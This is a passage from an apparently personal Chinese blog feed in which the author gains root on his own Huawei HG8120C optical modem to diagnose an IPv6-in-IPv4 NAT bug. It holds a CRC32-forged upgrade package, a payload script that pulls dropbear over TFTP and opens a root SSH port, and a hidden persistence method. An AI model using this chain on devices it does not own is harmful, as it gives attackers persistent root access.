+&lt;p&gt;这几行代码的意思是执行&lt;code&gt;/bin/hw_ldsp_cfg&lt;/code&gt;并等待某个标志文件的创建，等待超时5秒。分析&lt;code&gt;/bin/hw_ldsp_cfg&lt;/code&gt;发现，如果&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;和&lt;code&gt;/mnt/jffs2/flashtest&lt;/code&gt;两个文件同时都存在的情况下，会执行这个&lt;code&gt;/mnt/jffs2/equipment/bin/prbstest&lt;/code&gt;程序，这三个文件都位于&lt;code&gt;/mnt/jffs2&lt;/code&gt;路径下，都能被我们控制，同时也没有改变&lt;code&gt;1.sdk_init.sh&lt;/code&gt;中后续的正常启动流程，所以这是一个很好的候选者。&lt;/p&gt;
+&lt;p&gt;利用&lt;code&gt;/bin/hw_ldsp_cfg&lt;/code&gt;来执行&lt;code&gt;/mnt/jffs2/equipment/bin/prbstest&lt;/code&gt;需要满足的两个条件，其中一个是&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;，而这个文件存在表明设备处于“装备模式”，&lt;code&gt;grep&lt;/code&gt;后发现系统中很多程序在“装备模式”下，行为都会发生改变，这会增加太多的不确定性，所以当我们利用&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;启动我们的程序后，需要将此文件删除，尽可能保持系统原来的行为。同时也注意到&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;也是上面我们最后救命稻草的启动条件，也就是说如果文件存在，启动流程压根就不会走到&lt;code&gt;1.sdk_init.sh&lt;/code&gt;的426行，该如何解决这个冲突呢？&lt;code&gt;hw_ldsp_cfg&lt;/code&gt;是&lt;code&gt;elf&lt;/code&gt;文件，使用&lt;code&gt;open&lt;/code&gt;系统调用检查文件的存在性，而&lt;code&gt;1.sdk_ini.sh&lt;/code&gt;76行使用&lt;code&gt;shell&lt;/code&gt;脚本的&lt;code&gt;[ -f /mnt/jffs2/Equip.sh]&lt;/code&gt;来测试存在并且是普通文件。“普通文件”这个条件比单纯的系统调用&lt;code&gt;open&lt;/code&gt;更加严格，对设备文件等特殊文件来说&lt;code&gt;[ -f ... ]&lt;/code&gt;会失败，但&lt;code&gt;open&lt;/code&gt;调用不会，所以如果在路径&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;创建一个设备文件或管道等非普通文件，就可以达到我们的目的。&lt;/p&gt;
+&lt;p&gt;上述利用看起来能够完美工作，即不改变额外的系统原有行为，也达到了启动我们程序的目的。确实很完美，但只能完美工作一次，第二次设备重启后就不会工作了，因为为了尽可能保持系统原有行为，&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;已经被我们删除了，避免启用设备的“装备模式”行为。&lt;/p&gt;
+&lt;h1&gt;持久 VS 保持系统原有行为&lt;/h1&gt;
+&lt;p&gt;自启动要持久，特殊文件&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;就必须保留在&lt;code&gt;ubifs&lt;/code&gt;文件系统上，保证设备重启后继续存在，但要保持系统原有行为就又必须使得&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;不存在，设备不处于“装备模式”，两者完全对立。想到的办法就是当我们的程序运行起来后，插入一个内核模块，劫持对&lt;code&gt;ubifs&lt;/code&gt;文件系统的访问，将&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;隐藏起来，但实际文件还存在，重启后到插入我们的劫持模块前文件是可见的，这样便能使得“持久”和“保持系统原有行为”很好的共存了。详细可参考劫持模块源代码&lt;a href=&quot;https://github.com/LeeXiaolan/hwfw-tool/blob/master/persist-root-shell-poc/hijack/hijack.c&quot; title=&quot;hijack.c&quot;&gt;hijack.c&lt;/a&gt;。&lt;/p&gt;
+&lt;h1&gt;完整流程&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;创建符号链接&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;，将其指向设备文件&lt;code&gt;/dev/mtd2ro&lt;/code&gt;，这样保证&lt;code&gt;[ -f /mnt/jffs2/Equip.sh]&lt;/code&gt;失败。&lt;/li&gt;
+&lt;li&gt;创建空文件&lt;code&gt;/mnt/jffs2/flashtest&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;创建自启动文件&lt;code&gt;/mnt/jffss/equipment/bin/prbstest&lt;/code&gt;，在其中实现：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;检查&lt;code&gt;failsafe&lt;/code&gt;文件是否存在，如果存在立即退出，保证如果因为插入&lt;code&gt;hijack&lt;/code&gt;劫持模块或卸载模块导致系统重启后不再继续我们的自启动，打破重启循环。&lt;/li&gt;
+&lt;li&gt;创建&lt;code&gt;failsafe&lt;/code&gt;文件。&lt;/li&gt;
+&lt;li&gt;插入劫持模块&lt;code&gt;hijack.ko&lt;/code&gt;，用于中断符号链接&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;的follow link，保证&lt;code&gt;open&lt;/code&gt;等系统调用失败，保持原有系统行为。&lt;/li&gt;
+&lt;li&gt;移除&lt;code&gt;l3sfwd_ipv6&lt;/code&gt;，&lt;code&gt;rawip_adpt&lt;/code&gt;和&lt;code&gt;l3sfwd&lt;/code&gt;三个模块，解决&lt;code&gt;IPv6-in-IPv4&lt;/code&gt;丢包问题。&lt;/li&gt;
+&lt;li&gt;启动&lt;code&gt;dropbear&lt;/code&gt;，实现持久&lt;code&gt;root shell&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;启动正常，移除&lt;code&gt;failsafe&lt;/code&gt;文件，保证下次重启后自启动继续得到执行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1&gt;总结&lt;/h1&gt;
+&lt;p&gt;至此，HG8120C ONT上&lt;a href=&quot;/pwn-huawei-hg8120c-ont-via-uart-part-1.html&quot; title=&quot;PWN华为HG8120C光猫（一）&quot;&gt;&lt;code&gt;IPv6-in-IPv4&lt;/code&gt;丢包问题&lt;/a&gt;算是正式完美解决了，前后历时一个多月（原谅我比较懒，等文章写出来都已经是三四个月之后的事情了）。由于是在线设备，所以一切操作都选择了风险较小的做法，而不是高风险直接修改&lt;code&gt;rootfs&lt;/code&gt;的方法，保证fail safe，保证不损坏设备，网络和电话功能正常，额外还收获持久的设备root访问权限。&lt;/p&gt;
+&lt;p&gt;关于自启动逻辑中的fail safe，实际重启测试中，未发现插入或移除内核模块导致重启的情况，但是还是以防万一，毕竟小心行得万年船，避免任何不必要的风险。&lt;/p&gt;
+
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html">编译 OpenVPN 邂逅 ARM GCC bug</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html">无 kernel 源代码和 config 的情况下为 HG8120C 编译内核模块</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">PWN华为HG8120C光猫（一）</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html">https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2016-08-11T11:24:24Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html"/>
+      <id>https://blog.leexiaolan.tk/entry/post-pwn-huawei-hg8120c-ont</id>
+      <title>PWN华为HG8120C光猫之后</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;在&lt;a href=&quot;/pwn-huawei-hg8120c-ont-via-uart-part-1.html&quot; title=&quot;PWN华为HG8120C光猫（一）&quot;&gt;PWN华为HG8120C光猫（一）&lt;/a&gt;中，怀疑ONT造成了 &lt;code&gt;IPv6-in-IPv4&lt;/code&gt; 协议高丢包率，但是无法证明。然后在&lt;a href=&quot;/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html&quot; title=&quot;PWN华为HG8120C光猫（三）&quot;&gt;PWN华为HG8120C光猫（三）&lt;/a&gt;中，成功在ONT上获取了root shell，可以通过 &lt;code&gt;tcpdump&lt;/code&gt; 来抓包，来观察 &lt;code&gt;IPv6-in-IPv4&lt;/code&gt; 协议数据包是如何在通过ONT时被丢弃的。&lt;/p&gt;
+&lt;h1&gt;网络拓扑结构&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;+--------+         +-----+                 +---------------+
+| router |--------&amp;gt;| ONT |------- ... ----&amp;gt;| tunnel server |
++--------+         +-----+                 +---------------+
+192.168.1.88       192.168.1.1             74.x.x.x
+2001:xxxx::2       119.x.x.x               2001:xxxx::1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中，路由器还充当 tunnel client 的角色。ONT使用 &lt;code&gt;PPPoE&lt;/code&gt; 拨号到ISP获取公网IP 119.x.x.x，并做NAT到内网192.168.1.0/24。&lt;/p&gt;
+&lt;h1&gt;在ONT上使用 tcpdump 抓包&lt;/h1&gt;
+&lt;p&gt;静态编译链接 &lt;code&gt;tcpdump&lt;/code&gt;, 使用&lt;a href=&quot;/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html&quot; title=&quot;PWN华为HG8120C光猫（三）&quot;&gt;PWN华为HG8120C光猫（三）&lt;/a&gt;中获取到的root shell，运行 &lt;code&gt;./tcpdump -i any -w ipv6-drop.pcap&lt;/code&gt;。通过指定选项 &lt;code&gt;-i any&lt;/code&gt; 以便抓到ONT上所有接口的数据包。同时在路由器上运行 &lt;code&gt;ping6 2001:4860:4860::8888&lt;/code&gt;，来产生 &lt;code&gt;IPv6-in-IPv4&lt;/code&gt; 流量。下面就是抓取到的相关数据包：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1 IP 192.168.1.88 &amp;gt; 74.x.x.x: IP6 2001:xxxx::2 &amp;gt; 2001:4860:4860::8888: ICMP6, echo request, seq 1, length 64
+2 IP 119.x.x.x &amp;gt; 74.x.x.x: IP6 2001:xxxx::2 &amp;gt; 2001:4860:4860::8888: ICMP6, echo request, seq 1, length 64
+3 PPPoE  [ses 0x6f29] IP 119.x.x.x &amp;gt; 74.x.x.x: IP6 2001:xxxx::2 &amp;gt; 2001:4860:4860::8888: ICMP6, echo request, seq 1, length 64
+4 PPPoE  [ses 0x6f29] IP 74.x.x.x &amp;gt; 119.x.x.x: IP6 2001:4860:4860::8888 &amp;gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+5 IP 74.x.x.x &amp;gt; 119.x.x.x: IP6 2001:4860:4860::8888 &amp;gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+6 IP 74.x.x.x &amp;gt; 192.168.1.88: IP6 2001:4860:4860::8888 &amp;gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+7 IP 74.x.x.x &amp;gt; 192.168.1.88: IP6 2001:4860:4860::8888 &amp;gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+8 PPPoE  [ses 0x6f29] IP 192.168.1.88 &amp;gt; 74.x.x.x: IP6 2001:xxxx::2 &amp;gt; 2001:4860:4860::8888: ICMP6, echo request, seq 2, length 64
+9 PPPoE  [ses 0x6f29] IP 192.168.1.88 &amp;gt; 74.x.x.x: IP6 2001:xxxx::2 &amp;gt; 2001:4860:4860::8888: ICMP6, echo request, seq 3, length 64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;从上面抓包数据来看，只有 &lt;code&gt;seq 1&lt;/code&gt; 的ping收到了回复，这与路由器上 &lt;code&gt;ping6&lt;/code&gt; 的输出结果一致。与 &lt;code&gt;seq 1&lt;/code&gt; 相关的数据包是标号1-7号。仔细分析这7个包，正常流程是这样的：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;从路由器192.168.1.88出来的数据包，目的IP是tunnel server 74.x.x.x，其中封装了IPv6流量。&lt;/li&gt;
+&lt;li&gt;ONT对数据包进行NAT，将源IP改成ONT PPPoE获取的公网IP。&lt;/li&gt;
+&lt;li&gt;通过PPPoE协议将数据包封装发送到光路。到此上行流量已经离开ONT。&lt;/li&gt;
+&lt;li&gt;PPPoE收到从tunnel server发出的ping echo相关的数据包。&lt;/li&gt;
+&lt;li&gt;从PPPoE解包后的IP数据包，目的IP是119.x.x.x，ONT的公网IP。&lt;/li&gt;
+&lt;li&gt;ONT对数据进行NAT，将目的IP改写成192.168.1.88。&lt;/li&gt;
+&lt;li&gt;数据包从ONT Lan口去到路由器。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;而非正常流量8和9，直接就将流量封装在PPPoE协议中了，但没有对其中IP流量进行SNAT转换，直接使用路由器的内网IP 192.168.1.88当做源IP，这样的数据包到达ISP后会被如何处理，我想不到。但可以肯定的是，ONT是肯定收不到数据回包了。这样的异常流程，Lan的流量根本就没有到达ONT的Lan口，就被网卡驱动程序莫名其妙的封装在PPPoE协议中，直接注入到ppp网络接口中去了。这样的功能看起来像是为ISP提供IPv6支持服务的，然而ISP并未启用IPv6，驱动没有对未启用IPv6的情况进行测试，进而导致这样的问题。&lt;/p&gt;
+&lt;h1&gt;解决方案&lt;/h1&gt;
+&lt;p&gt;想自行修复这样的问题，在没有任何代码的情况下，完全不知道如何下手，想了几天，但毫无头绪，只能想办法绕过。ONT还有一个上网模式是桥接，使用桥接后，ONT不进行PPPoE拨号，通过路由器来拨号上网，这样ONT连ppp网络接口都没有了，那个有bug的驱动应该不会生效了吧。那就来试试吧，使用 &lt;code&gt;telecomadmin&lt;/code&gt; 用户web登录ONT，改成桥接模式后，路由器上使用对应用户名和密码拨号后，重新测试 &lt;code&gt;ping6&lt;/code&gt;，再也没有了丢包的情况了。&lt;/p&gt;
+&lt;h1&gt;结论&lt;/h1&gt;
+&lt;p&gt;从发现问题，以为是ONT丢包，到最后使用 &lt;code&gt;tcpdump&lt;/code&gt; 确诊，发现不是丢包，而是没有正确进行NAT，顺带还PWN了ONT，最后使用桥接绕过有bug的驱动，问题总算非完美解决了。&lt;/p&gt;
+
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html">编译 OpenVPN 邂逅 ARM GCC bug</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html">无 kernel 源代码和 config 的情况下为 HG8120C 编译内核模块</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html">HG8120C持久root shell及完美解决IPv6丢包</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">PWN华为HG8120C光猫（一）</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2016-07-04T14:04:47Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html"/>
+      <id>https://blog.leexiaolan.tk/entry/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3</id>
+      <title>PWN华为HG8120C光猫（三）</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;&lt;a title=&quot;PWN华为HG8120C光猫（二）&quot; href=&quot;/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html&quot;&gt;上一篇博文&lt;/a&gt;中，通过抓取分析华为维修使能工具发送到UDP数据包，从中得到了完整的有效载荷&lt;a title=&quot;原始payload.bin&quot; href=&quot;https://github.com/LeeXiaolan/hwfw-tool/raw/master/test/upgrade.bin&quot;&gt;payload.bin&lt;/a&gt;。粗略浏览 &lt;code&gt;payload.bin&lt;/code&gt; 中的字符串，发现可以修改 &lt;code&gt;payload.bin&lt;/code&gt; 的内容来执行任意代码。所以，本文就对 &lt;code&gt;payload.bin&lt;/code&gt; 的结构进行简单分析，修改并构造我们自己的payload，来达到执行任意代码的目的。&lt;/p&gt;
+&lt;h1&gt;简单天真的尝试&lt;/h1&gt;
+&lt;p&gt;仅仅改变 &lt;code&gt;payload.bin&lt;/code&gt; 中的一个字节，看目标设备是否进行合法行检查，于是用二进制编辑器，将脚本中原来的 &lt;code&gt;var_etc_version=&quot;&quot;&lt;/code&gt; 改成 &lt;code&gt;var_etc_version=&#39;&#39;&lt;/code&gt;，双引号改成单引号，对脚本原来的功能没有影响，也不改变脚本文件大小，保存修改为 &lt;code&gt;payload-mod.bin&lt;/code&gt;，并加载到目标设备。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WAP&amp;gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&amp;gt;Software Operation Faild!RetCode=0xf7204039!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;被设备拒绝了，没什么意外的。&lt;/p&gt;
+&lt;h1&gt;payload.bin 结构分解&lt;/h1&gt;
+&lt;p&gt;既然设备对有效载荷 &lt;code&gt;payload-mod.bin&lt;/code&gt; 进行了完整性检查，想修改并成功运行就必须对文件结构进行分解，找到完整性检验信息，继而修正之。那就先来看看文件头的16进制表示。&lt;/p&gt;
+&lt;p&gt;&lt;img title=&quot;有效载荷头信息&quot; src=&quot;../media/ag5zfmJsb2ctbGVlLWhyZHIOCxIFTWVkaWEYsu33Agw/payload-header-annotated.png&quot; alt=&quot;payload.bin hex dump&quot; width=&quot;520px&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;如上图，文件头被填充的 &lt;code&gt;0x00&lt;/code&gt; 分隔成了几个部分，并且具有很明显的重复模式。第二部分中，ASCII字符串 &lt;code&gt;file:/var/UpgradeCheck.xml&lt;/code&gt; 很像文件名。既然有文件名，就因该有文件数据，想要定义文件数据，通常做法是，一个偏移来确定数据在载荷中的位置，也许还需要一个整数来指定数据长度（如果用相邻两个偏移之差来定义前一个文件的大小就不需要指定长度）。在文件名前面有12个字节的非零数据，当作三个4字节的整数来理解，将其中两个较小的 &lt;code&gt;0x00000994&lt;/code&gt; 和 &lt;code&gt;0x0000042d&lt;/code&gt; 解释成偏移和长度，看起来非常合理。试着这样解释，从载荷中找到这两个数定义的数据如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0000990: 0000 0000 3c75 7067 7261 6465 6368 6563  ....&amp;lt;upgradechec
+00009a0: 6b3e 0d0a 3c48 6172 6456 6572 4368 6563  k&amp;gt;..&amp;lt;HardVerChec
+00009b0: 6b20 4368 6563 6b45 6e61 626c 653d 2230  k CheckEnable=&quot;0
+00009c0: 223e 0d0a 3c49 6e63 6c75 6465 4c69 7374  &quot;&amp;gt;..&amp;lt;IncludeList
+00009d0: 2045 6e61 626c 653d 2231 222f 3e0d 0a3c   Enable=&quot;1&quot;/&amp;gt;..&amp;lt;
+...
+0000d90: 2045 6e61 626c 653d 2230 222f 3e0d 0a3c   Enable=&quot;0&quot;/&amp;gt;..&amp;lt;
+0000da0: 2f43 6667 4368 6563 6b3e 0d0a 3c2f 7570  /CfgCheck&amp;gt;..&amp;lt;/up
+0000db0: 6772 6164 6563 6865 636b 3e0d 0a0d 0a0d  gradecheck&amp;gt;.....
+0000dc0: 0a1f 8b08 00b6 2287 5300 03ec 5d7b 93d3  ......&quot;.S...]{..
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;数据刚好也是XML片段，符合文件名的 &lt;code&gt;.xml&lt;/code&gt; 后缀，并且与前后数据（均包含非可打印字符）的分界也很明显，很好地印证了前面关于偏移和长度的猜测。最后剩下的那四个字节，看起来比较随机，该如何解释呢？想到&lt;a title=&quot;PWN华为HG8120C光猫（二）&quot; href=&quot;/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html&quot;&gt;上一篇&lt;/a&gt;中使用 &lt;code&gt;CRC32&lt;/code&gt; 来校验 &lt;code&gt;UDP&lt;/code&gt; 数据包，而 &lt;code&gt;CRC32&lt;/code&gt; 的结果刚好也是四个字节，很自然就想到可能是文件数据的 &lt;code&gt;CRC32&lt;/code&gt; 校验信息。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@localhost $ dd if=payload-mod.bin of=UpgradeCheck.xml bs=1 skip=$((0x994)) count=$((0x42d))
+1069+0 records in
+1069+0 records out
+1069 bytes (1.1 kB) copied, 0.00196642 s, 544 kB/s
+leexiaolan@localhost $ crc32 UpgradeCheck.xml
+52ee2f6d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Bingo! 的确是文件数据的 &lt;code&gt;CRC32&lt;/code&gt; 校验信息。更进一步，&lt;code&gt;0x994+0x42d=0xdc1&lt;/code&gt; 也和下一个文件的偏移吻合。&lt;/p&gt;
+&lt;p&gt;有了上面这些信息，那就来修正 &lt;code&gt;payload-mod.bin&lt;/code&gt; 中的 &lt;code&gt;CRC32&lt;/code&gt;。我们需要修改是这个 &lt;code&gt;duit9rr.sh&lt;/code&gt; 文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;00006c0: 0000 0000 0400 0000 40c0 460e d156 0100  ........@.F..V..
+00006d0: c112 0000 6669 6c65 3a2f 746d 702f 6475  ....file:/tmp/du
+00006e0: 6974 3972 722e 7368 0000 0000 0000 0000  it9rr.sh........
+
+leexiaolan@localhost $ dd if=payload-mod.bin of=duit9rr.sh bs=1 skip=$((0x156d1)) count=$((0x12c1))
+4801+0 records in
+4801+0 records out
+4801 bytes (4.8 kB) copied, 0.00834645 s, 575 kB/s
+leexiaolan@localhost $ crc32 duit9rr.sh
+74aae506
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;用二进制编辑器将正确的 &lt;code&gt;CRC32&lt;/code&gt; 写进 &lt;code&gt;payload-mod.bin&lt;/code&gt;，加载。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WAP&amp;gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&amp;gt;Software Operation Faild!RetCode=0xf7204039!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还是同样的错误信息。再仔细检查了几遍，没有发现计算错误的地方，估计是除了对包含的文件检验外，还有对整个 &lt;code&gt;payload-mob.bin&lt;/code&gt; 的完整性校验。再返回去看 &lt;code&gt;payload.bin&lt;/code&gt; 头的16进制信息。在最前面的几十个字节中，除了固定的魔数，看起来像文件长度，数据偏移，文件个数的信息外，还有两个四字节的数据 &lt;code&gt;0xc1ce7077&lt;/code&gt; 和 &lt;code&gt;0x88f67efc&lt;/code&gt;，没什么规律，估计又是某段数据的 &lt;code&gt;CRC32&lt;/code&gt; 校验信息。于是就假设其是某段连续数据的 &lt;code&gt;CRC32&lt;/code&gt;，由于整个文件不太大（92630字节），暴力枚举看起来可行。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@localhost $ cat findcrc32
+#!/usr/bin/env python2
+
+from __future__ import print_function
+import sys
+import zlib
+
+with open(sys.argv[1], &#39;rb&#39;) as f:
+  data = f.read()
+expectedCrc32 = int(sys.argv[2], base=0)
+for i in xrange(0, len(data)):
+  crc32 = 0
+  for j in xrange(i, len(data)):
+    crc32 = zlib.crc32(data[j], crc32)
+    if expectedCrc32 == crc32 &amp;amp; 0xffffffff:
+      print(&#39;Found at %s[0x%x:0x%x].&#39; % (sys.argv[1], i, j + 1))
+      sys.exit(0)
+
+leexiaolan@localhost $ time ./findcrc32 payload.bin 0xc1ce7077
+Found at payload.bin[0xc:0x169d6].
+
+real    0m0.432s
+user    0m0.427s
+sys     0m0.004s
+leexiaolan@localhost $ time ./findcrc32 payload.bin 0x88f67efc
+Found at payload.bin[0x14:0x994].
+
+real    0m0.039s
+user    0m0.034s
+sys     0m0.008s
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;又全中，是我人品太好还是&amp;hellip;&amp;hellip;根据这两个 &lt;code&gt;CRC32&lt;/code&gt; 的计算方法，继续修正 &lt;code&gt;payload-mod.bin&lt;/code&gt;，加载。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WAP&amp;gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&amp;gt;Software Operation Successful!RetCode=0x0!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看到这&lt;em&gt;&lt;code&gt;Software Operation Successful!RetCode=0x0!&lt;/code&gt;&lt;/em&gt;，终于成功啦，有点小激动。&lt;/p&gt;
+&lt;h1&gt;root shell&lt;/h1&gt;
+&lt;p&gt;接下来就该测试修改后的脚本的执行情况。将 &lt;code&gt;duit9rr.sh&lt;/code&gt; 改成如下脚本：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/sh
+
+tftp -g 192.168.1.2 -r dropbear -l /tmp/dropbear
+tftp -g 192.168.1.2 -r hostkey -l /tmp/hostkey
+tftp -g 192.168.1.2 -r rsa.pub -l /tmp/authorized_keys
+iptables -I INPUT -p tcp --dport 2222 -j ACCEPT
+chmod 777 /tmp/dropbear
+chmod 600 /tmp/authorized_keys
+/tmp/dropbear -r /tmp/hostkey -p 2222
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这段脚本比原文件内容要短很多，为了避免其它意外，多余字节用空白字符填充，修正上述三个 &lt;code&gt;CRC32&lt;/code&gt; 校验值，最终的 &lt;code&gt;payload-mod.bin&lt;/code&gt; 就完成了。修改 &lt;code&gt;dropbear&lt;/code&gt; 读取 &lt;code&gt;/tmp&lt;/code&gt; 文件夹下的公钥文件。加载最终版本的 &lt;code&gt;payload-mod.bin&lt;/code&gt; 至目标设备。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WAP&amp;gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&amp;gt;Software Operation Successful!RetCode=0x0!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用 &lt;code&gt;ssh&lt;/code&gt; 连接目标设备：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@localhost $ ssh root@192.168.1.1 -p 2222
+
+BusyBox v1.18.4 (2015-06-27 14:02:58 CST) built-in shell (ash)
+Enter &#39;help&#39; for a list of built-in commands.
+
+profile close core dump
+WAP(Dopra Linux) # id
+uid=0(root) gid=0(root) groups=0(root)
+WAP(Dopra Linux) # cat /etc/wap/wap_version
+V800R015C10SPC189B001
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;哈哈，root shell 到手了，可以继续最早的问题了，在ONT上抓包，确诊 &lt;code&gt;IPv6-in-IPv4&lt;/code&gt; 丢包的问题。待续&amp;hellip;&amp;hellip;&lt;/p&gt;
+&lt;p&gt;P.S: 解包，重新打包 &lt;code&gt;payload.bin&lt;/code&gt; 并修正对应 &lt;code&gt;CRC32&lt;/code&gt; 的代码，在整理后完成后，将开源在&lt;a title=&quot;华为ONT升级包修改重打包工具&quot; href=&quot;https://github.com/LeeXiaolan/hwfw-tool&quot;&gt;github&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;2016-6-23 11:09 更新：源代码已经推送到&lt;a href=&quot;https://github.com/LeeXiaolan/hwfw-tool&quot;&gt;github&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;2016-7-3 23:09 更新：获取root shell poc使用的所有文件上传&lt;a href=&quot;https://github.com/LeeXiaolan/hwfw-tool/tree/master/root-shell-poc&quot;&gt;github&lt;/a&gt;。&lt;/p&gt;
+
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html">编译 OpenVPN 邂逅 ARM GCC bug</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html">无 kernel 源代码和 config 的情况下为 HG8120C 编译内核模块</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html">HG8120C持久root shell及完美解决IPv6丢包</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html">https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2016-06-18T04:32:26Z</updated>
+  </entry>
+
+  <entry>
